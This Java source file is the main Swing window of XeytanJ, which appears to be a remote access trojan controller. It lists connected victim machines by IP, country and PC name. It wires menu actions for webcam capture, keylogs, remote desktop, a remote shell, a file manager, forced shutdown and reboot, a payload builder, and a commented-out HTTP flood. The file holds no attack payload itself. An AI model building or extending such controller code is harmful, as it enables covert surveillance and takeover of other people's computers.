package com.melardev.xeytanj.gui.main;


import com.melardev.xeytanj.XeytanJApplication;
import com.melardev.xeytanj.enums.NetworkProtocol;
import com.melardev.xeytanj.enums.ProcessInfoDetails;
import com.melardev.xeytanj.gui.GUIAbout;
import com.melardev.xeytanj.gui.IGui;
import com.melardev.xeytanj.gui.mediator.IUiMediator;
import com.melardev.xeytanj.models.Client;
import com.melardev.xeytanj.services.IAppMessages;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.*;
import java.util.UUID;

public class MainGui extends JFrame implements IGui<MainUiListener> {

    private MainUiListener listener;

    private JTable tableClients;
    private DefaultTableModel modelTableClients;

    private JPopupMenu popupClients;

    JMenuItem menuCamera;

    JMenuItem menuDesktop;

    JMenuItem menuKeylogs;

    JMenuItem menuFileManager;

    JMenuItem menuRemoteShell;

    private JMenuItem menuUninstallServer;

    private JMenuItem menuCloseConnection;

    private JMenuItem mntmTcp;

    private JMenuItem mntmUdp;

    JMenuItem menuListProcess;
    JMenuItem menuChat;

    private JMenu mntmVoiceRecorder;
    JMenuItem mntmFile;
    JMenuItem mntmRaw;

    private JMenuItem mnBarBuilder;
    private JMenu mnBarEdit;
    private JMenuItem mnBarPreferences;

    private JMenuItem mnBarListenTo;

    private JMenuItem mnBarExit;

    private JMenuItem mnBarAbout;

    private JMenuItem menuHttpFlood;

    JMenuItem menuLockSystem;

    JMenuItem menuLogOff;

    JMenuItem menuShutdown;

    JMenuItem menuReboot;

    JMenuItem menuTurnOffDisplay;

    JMenuItem menuTurnOnDisplay;

    private JMenu mnBarMaps;

    private JMenuItem mnBarMapsInBrowser;

    private JMenuItem mnBarMapsJavafx;
    private JMenuItem menuRegedit;
    JMenuItem menuInfo;

    private IUiMediator mediator;
    private IAppMessages messageProvider;


    public MainGui() {

    }

    public void addClient(String OS, String country, String global_ip, String local_ip, String pcName,
                          String JreVersion, UUID uuid) {
        ((DefaultTableModel) tableClients.getModel())
                .addRow(new Object[]{OS, country, global_ip, local_ip, pcName, JreVersion, uuid});
    }

    private void addPopup(Component component, final JPopupMenu popup) {
        component.addMouseListener(new MouseAdapter() {
            public void mousePressed(MouseEvent e) {
                if (e.isPopupTrigger()) {
                    Component c = e.getComponent();
                    e.getPoint();
                    showMenu(e);
                }
            }

            public void mouseReleased(MouseEvent e) {
                if (e.isPopupTrigger()) {
                    showMenu(e);
                }
            }

            private void showMenu(MouseEvent e) {
                JTable table = (JTable) e.getComponent();
                int selectedRows = table.getSelectedRowCount();
                int row = table.rowAtPoint(e.getPoint());
                if (selectedRows < 2)
                    table.setRowSelectionInterval(row, row);
                popup.show(e.getComponent(), e.getX(), e.getY());
            }
        });
    }

    @Override
    public void display() {
        addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                super.windowClosing(e);
                notifyMediatorOnClose();
            }
        });

        // JDesktopPane desktopPane = new JDesktopPane();
        /*
        GroupLayout groupLayout = new GroupLayout(getContentPane());
        groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
                .addComponent(desktopPane,
                        GroupLayout.Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 525, Short.MAX_VALUE));
        groupLayout.setVerticalGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(desktopPane,
                GroupLayout.Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 319, Short.MAX_VALUE));
        */

        // JInternalFrame frameClients = new JInternalFrame("XeytanApplication Title", true, true, true, true);
        // frameClients.setBounds(0, 0, 608, 486);
        // desktopPane.add(frameClients);

        tableClients = new JTable();
        tableClients.setFillsViewportHeight(true);
        tableClients.setEnabled(true);
        tableClients.setShowGrid(false);
        tableClients.setDropMode(DropMode.ON);
        tableClients.setSurrendersFocusOnKeystroke(true);

        tableClients.setSelectionMode(ListSelectionModel.SINGLE_INTERVAL_SELECTION);
        tableClients.setRowHeight(48);
        // tableClients.setBounds(0, 0, frameClients.getWidth(), frameClients.getHeight());


        tableClients.setBounds(0, 0, getWidth(), getHeight());
        Object[] columnNames = new Object[]{
                messageProvider.getText("gui.main.clients_table.os_column.name"),
                messageProvider.getText("gui.main.clients_table.os_column.country"),
                messageProvider.getText("gui.main.clients_table.os_column.global_ip"),
                messageProvider.getText("gui.main.clients_table.os_column.local_ip"),
                messageProvider.getText("gui.main.clients_table.os_column.pc_name"),
                messageProvider.getText("gui.main.clients_table.os_column.uuid"),
                "Client", // Used only to save the Client object, not for rendering
        };

        /*
        Object[][] data = {
                {"android_48", "albania", "66.243.2.1", "192.168.4.3", "Pcname", UUID.randomUUID(), new Client(null)},
                {"windows_32", "Spain", "192.168.1.1", "192.168.1.1", "MyPc", UUID.randomUUID(), new Client(null)}};
        modelTableClients = new DefaultTableModel(data, columnNames);
        modelTableClients.addRow(new Object[]{"linux_32", "France", "192.168.1.2", "192.168.1.100", "LinuxPC", UUID.randomUUID(), new Client(null)});
        */

        modelTableClients = new DefaultTableModel(columnNames, 0);

        tableClients.setModel(modelTableClients);
        //tableClients.setDefaultRenderer(Object.class, new TableRenderer());
        tableClients.getColumn(tableClients.getModel().getColumnName(0))
                .setCellRenderer(new TableClientsRenderer("os"));
        tableClients.getColumn(tableClients.getModel().getColumnName(1))
                .setCellRenderer(new TableClientsRenderer("country"));

        // Hide the UUID Column
        tableClients.removeColumn(tableClients.getColumn("UUID"));
        tableClients.removeColumn(tableClients.getColumn("Client"));


        tableClients.addMouseListener(new TableClientsMouseHandler(tableClients));

        JScrollPane scrollClients = new JScrollPane(tableClients);
        ClientPopupMenu menuClientHandler = new ClientPopupMenu(this);
        MenuItemHandler menuItemHandler = new MenuItemHandler();
        popupClients = new JPopupMenu();
        addPopup(tableClients, popupClients);

        menuCamera = new JMenuItem("Camera");
        menuCamera.setIcon(new ImageIcon(MainGui.class.getClassLoader().getResource("icons/utils/Webcam-16.png")));
        menuCamera.addActionListener(menuClientHandler);

        menuInfo = new JMenuItem("Info");
        menuInfo.addActionListener(menuClientHandler);
        popupClients.add(menuInfo);
        popupClients.add(menuCamera);

        menuDesktop = new JMenuItem("Remote Desktop");
        menuDesktop.setIcon(new ImageIcon(getClass().getClassLoader().getResource("icons/utils/Monitor-16.png")));
        menuDesktop.addActionListener(menuClientHandler);
        popupClients.add(menuDesktop);

        menuKeylogs = new JMenuItem("KeyLogs");
        menuKeylogs.setIcon(new ImageIcon(MainGui.class.getClassLoader().getResource("icons/utils/Keyboard-32.png")));
        menuKeylogs.addActionListener(menuClientHandler);
        popupClients.add(menuKeylogs);

        mntmVoiceRecorder = new JMenu("Voice Recorder (Not implemented)");
        mntmVoiceRecorder.setIcon(new ImageIcon(MainGui.class.getClassLoader().getResource("icons/utils/voip.png")));
        mntmVoiceRecorder.setEnabled(false);
        popupClients.add(mntmVoiceRecorder);


        mntmFile = new JMenuItem("FILE");
        mntmFile.addActionListener(menuClientHandler);
        mntmVoiceRecorder.add(mntmFile);

        mntmRaw = new JMenuItem("RAW");
        mntmRaw.addActionListener(menuClientHandler);
        mntmVoiceRecorder.add(mntmRaw);

        menuFileManager = new JMenuItem("File Manager");
        menuFileManager.setIcon(new ImageIcon(MainGui.class.getClassLoader().getResource("icons/utils/Server Filled-32.png")));
        menuFileManager.addActionListener(menuClientHandler);
        popupClients.add(menuFileManager);

        menuRemoteShell = new JMenuItem("Remote Shell");
        menuRemoteShell.setIcon(new ImageIcon(MainGui.class.getClassLoader().getResource("icons/utils/gnome-terminal-32.png")));
        menuRemoteShell.addActionListener(menuClientHandler);
        popupClients.add(menuRemoteShell);

        menuListProcess = new JMenuItem("List process");
        menuListProcess.setIcon(new ImageIcon(MainGui.class.getClassLoader().getResource("icons/utils/list_process_32.png")));
        menuListProcess.addActionListener(menuClientHandler);
        popupClients.add(menuListProcess);

        menuChat = new JMenuItem("Open Chat");
        menuChat.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/Chat_open.png")));
        menuChat.addActionListener(menuClientHandler);
/*
        menuRegedit = new JMenuItem("Regedit");
        menuRegedit.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/regedit_16.png")));
        popupClients.add(menuRegedit);

        menuHttpFlood = new JMenuItem("HTTP Flood");
        menuHttpFlood.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/firewall2_32.png")));
        popupClients.add(menuHttpFlood);
*/
        JMenu menuTroll = new JMenu("Troll");
        menuTroll.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/troll_32.png")));
        popupClients.add(menuTroll);

        menuLockSystem = new JMenuItem("Lock System");
        menuLockSystem.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/lockPc_32.png")));
        menuTroll.add(menuLockSystem);
        menuLockSystem.addActionListener(menuClientHandler);

        menuLogOff = new JMenuItem("Log Off");
        menuLogOff.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/LogOff_32.png")));
        menuTroll.add(menuLogOff);
        menuLogOff.addActionListener(menuClientHandler);

        menuShutdown = new JMenuItem("ShutDown Pc");
        menuShutdown.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/shutdown_32.png")));
        menuTroll.add(menuShutdown);
        menuShutdown.addActionListener(menuClientHandler);

        menuReboot = new JMenuItem("Reboot");
        menuReboot.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/restart_32.png")));
        menuTroll.add(menuReboot);
        menuReboot.addActionListener(menuClientHandler);

        menuTurnOffDisplay = new JMenuItem("Turn Off Display");
        menuTurnOffDisplay.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/computerOff_32.png")));
        menuTroll.add(menuTurnOffDisplay);
        menuTurnOffDisplay.addActionListener(menuClientHandler);

        menuTurnOnDisplay = new JMenuItem("Turn On Display");
        menuTurnOnDisplay.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/computerOn_32.png")));
        menuTroll.add(menuTurnOnDisplay);
        popupClients.add(menuChat);
        menuTurnOnDisplay.addActionListener(menuClientHandler);

        menuCloseConnection = new JMenuItem("Close Connection");
        menuCloseConnection.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/Cancel-32.png")));

        popupClients.add(menuCloseConnection);

        menuUninstallServer = new JMenuItem("Uninstall Server");
        menuUninstallServer.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/uninstall-32.png")));

        popupClients.add(menuUninstallServer);


        GroupLayout groupLayout = new GroupLayout(getContentPane());
        groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
                .addComponent(scrollClients,
                        GroupLayout.Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 525, Short.MAX_VALUE));
        groupLayout.setVerticalGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(scrollClients,
                GroupLayout.Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 319, Short.MAX_VALUE));


        // frameClients.getContentPane().add(scrollClients, BorderLayout.SOUTH);
        // frameClients.setVisible(true);

        getContentPane().setLayout(groupLayout);

        JMenuBar menuBar = new JMenuBar();
        setJMenuBar(menuBar);

        JMenu mnBarCore = new JMenu("Tools");
        menuBar.add(mnBarCore);

        mnBarBuilder = new JMenuItem("Builder");
        mnBarBuilder.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/builder_32.png")));
        mnBarBuilder.addActionListener(menuItemHandler);
        mnBarCore.add(mnBarBuilder);

        mnBarListenTo = new JMenuItem("Listen to");
        mnBarListenTo.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/antenna.png")));
        mnBarCore.add(mnBarListenTo);
        mnBarListenTo.addActionListener(menuItemHandler);
        mnBarListenTo.setEnabled(false);

        /*
        JMenuItem mnBarNoIp = new JMenuItem("No-IP Service");
        mnBarNoIp.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/noip2_32.png")));
        mnBarCore.add(mnBarNoIp);

        mnBarMaps = new JMenu("Maps Summary");
        mnBarMaps.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/maps2_32.png")));
        mnBarCore.add(mnBarMaps);

        mnBarMapsJavafx = new JMenuItem("Maps JavaFX");
        mnBarMapsJavafx.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/java_32.png")));
        mnBarMaps.add(mnBarMapsJavafx);
        mnBarMapsJavafx.addActionListener(menuItemHandler);

        mnBarMapsInBrowser = new JMenuItem("Maps in Browser");
        mnBarMapsInBrowser.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/browser_32.png")));
        mnBarMaps.add(mnBarMapsInBrowser);
        mnBarMapsInBrowser.addActionListener(menuItemHandler);

        JMenuItem mnBarDb = new JMenuItem("View Database");
        mnBarDb.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/database_32.png")));
        mnBarCore.add(mnBarDb);
*/
        mnBarExit = new JMenuItem("Exit");
        mnBarExit.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/exit_32.png")));
        mnBarCore.add(mnBarExit);
        mnBarExit.addActionListener(menuItemHandler);

        mnBarEdit = new JMenu("Edit");
        menuBar.add(mnBarEdit);

        mnBarPreferences = new JMenuItem("Preferences");
        mnBarPreferences.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/preferences_32.png")));
        mnBarEdit.add(mnBarPreferences);
        mnBarPreferences.addActionListener(menuItemHandler);

        JMenu mnBarHelp = new JMenu("Help");
        menuBar.add(mnBarHelp);

        mnBarAbout = new JMenuItem("About");
        mnBarAbout.setIcon(new ImageIcon(XeytanJApplication.class.getClassLoader().getResource("icons/utils/help_32.png")));
        mnBarHelp.add(mnBarAbout);
        mnBarAbout.addActionListener(menuItemHandler);

        Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
        setLocationRelativeTo(null);
        setTitle("XeytaJ");
        pack();
        setVisible(true);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    @Override
    public void addListener(MainUiListener mainUiListener) {
        listener = mainUiListener;
    }

    @Override
    public MainUiListener getListener() {
        return listener;
    }


    @Override
    public IUiMediator getMediator() {
        return this.mediator;
    }

    @Override
    public void setMediator(IUiMediator mediator) {
        this.mediator = mediator;
    }

    @Override
    public void resetState() {
    }

    @Override
    public void setMessageProvider(IAppMessages messageProvider) {
        this.messageProvider = messageProvider;
    }


    public void addClient(Client client) {
        ((DefaultTableModel) tableClients.getModel())
                .addRow(new Object[]{client.getOs(), client.getGeoData().getCountry(),
                        client.getGlobalIp(), client.getLocalIp(), client.getPcName(),
                        client.getId(),
                        client
                });
    }

    void onTurnOnOffDisplayClicked(Client client, boolean on) {
        listener.onTurnOnOffDisplayClicked(client, on);
    }

    void onRebootClicked(Client client) {
        listener.onRebootClicked(client);
    }

    void onShutdownClicked(Client client) {
        listener.onShutdownClicked(client);
    }

    void onLogOffSystem(Client client) {
        listener.onLogOffSystem(client);
    }

    void onLockSystemClicked(Client client) {
        listener.onLockSystemClicked(client);
    }

    void onSessionKeyloggerClicked(Client client) {
        listener.onSessionKeyloggerClicked(client);
    }

    void onVoIpRawClicked(Client client) {
        listener.onVoIpRawClicked(client);
    }

    void onVoIpClicked(Client client) {
        listener.onVoIpClicked(client);
    }

    void onStartChatClicked(Client client) {
        listener.onStartChatRequested(client);

    }

    void onRemoteFileManagerClicked(Client client) {
        listener.onRemoteFileManagerClicked(client);
    }

    void onRemoteDesktopClicked(Client client) {
        listener.onRemoteDesktopClicked(client);
    }

    void onMenuCameraClicked(NetworkProtocol protocol, Client client) {
        listener.onCameraStartRequested(protocol, client);
    }

    void onProcessListClicked(ProcessInfoDetails infoLevel, Client client) {
        listener.onProcessListClicked(infoLevel, client);
    }

    void onRemoteShellClicked(Client client) {
        listener.onRemoteShellClicked(client);
    }

    void getClientInfo(Client client) {
        getListener().getClientInfo(client);
    }

    public JTable getTableClients() {
        return tableClients;
    }

    public void setTableClients(JTable tableClients) {
        this.tableClients = tableClients;
    }

    public class MenuItemHandler implements ActionListener {

        @Override
        public void actionPerformed(ActionEvent evt) {
            Object source = evt.getSource();
            if (source == mnBarBuilder) {
                onBuilderShowClicked();
            } else if (source == mnBarListenTo) {
            } else if (source == mnBarPreferences) {
                onPreferencesClicked();
            } else if (source == mnBarAbout) {
                onAboutClicked();
            } else if (source == mnBarExit) {
                onExitClicked();
            } else if (source == mnBarMapsInBrowser) {
                onMapBrowserShow();
            } else if (source == mnBarMapsJavafx) {
                onMapFxShow();
            }
        }
    }

    private void onMapFxShow() {

        //MapsFX mapsJ = new MapsFX(XeytanApplication.this);
        //mapsJ.display(getLocations());
    }

    private void onMapBrowserShow() {
        mediator.showMapRequested();
    }

    private void onExitClicked() {
        System.exit(0);
    }

    private void onAboutClicked() {
        new GUIAbout().display();
    }

    private void onPreferencesClicked() {
        listener.onPreferencesClicked();
    }

    private void onBuilderShowClicked() {
        listener.onBuilderShowClicked();
    }

    synchronized public void deleteRow(UUID uuid) {
        DefaultTableModel model = ((DefaultTableModel) tableClients.getModel());
        int colIndex = model.findColumn("UUID");
        for (int i = 0; i < model.getRowCount(); i++) {
            if (model.getValueAt(i, colIndex).equals(uuid)) {
                model.removeRow(i);
                break;
            }
        }
    }
}
